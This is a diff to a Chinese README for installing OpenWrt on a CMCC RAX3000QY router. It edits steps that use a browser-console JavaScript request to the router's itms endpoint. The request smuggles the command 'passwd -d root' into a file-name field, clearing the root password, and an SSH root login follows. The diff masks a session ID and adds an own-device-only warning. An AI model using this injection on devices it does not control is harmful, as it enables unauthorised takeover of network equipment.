@@ -25,7 +25,7 @@
 - 打开 Chrome 调试窗口，切换到「网络（Network）」
 - 刷新页面后，找到 `items` 相关的 POST 请求
 - 在「负载（Payload）」中找到 `sessionId` 并记录
-- 切换到「控制台（Console）」，输入以下脚本（注意替换 `sessionId` 和 IP，示例里是 `cmcc.wifi`）：
+- 切换到「控制台（Console）」，输入以下脚本（注意替换 `sessionId` 和路由器地址；示例中地址为 `cmcc.wifi`，请同步替换 `url` 与下方 SSH 命令中的主机名）：
 
   ```javascript
   var url = "http://cmcc.wifi/itms";
@@ -33,7 +33,7 @@
     cmd: 22,
     fname: "websys.log|passwd -d root",
     method: "get",
-    sessionId: "98eca7a1fc3c731fa2de89c04348bb69"
+    sessionId: "YOUR_SESSION_ID_HERE"
   };
   var xhr = new XMLHttpRequest();
   xhr.open("POST", url, true);
@@ -56,6 +56,8 @@
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa root@cmcc.wifi
   ```
+
+- ⚠️ 该脚本属于利用漏洞的临时提权手段，请仅在自有设备上使用，勿用于共享或公共网络设备，并确认执行后会清空 root 密码；连接成功后建议立即执行 `passwd root` 设置新密码。
 
 ### 2. 取得 Telnet（二选一）
 
@@ -97,4 +99,3 @@
 ---
 
 ![Star History Chart](https://api.star-history.com/svg?repos=sfxfs/rax3000qy-OpenWrt&type=Date)
-
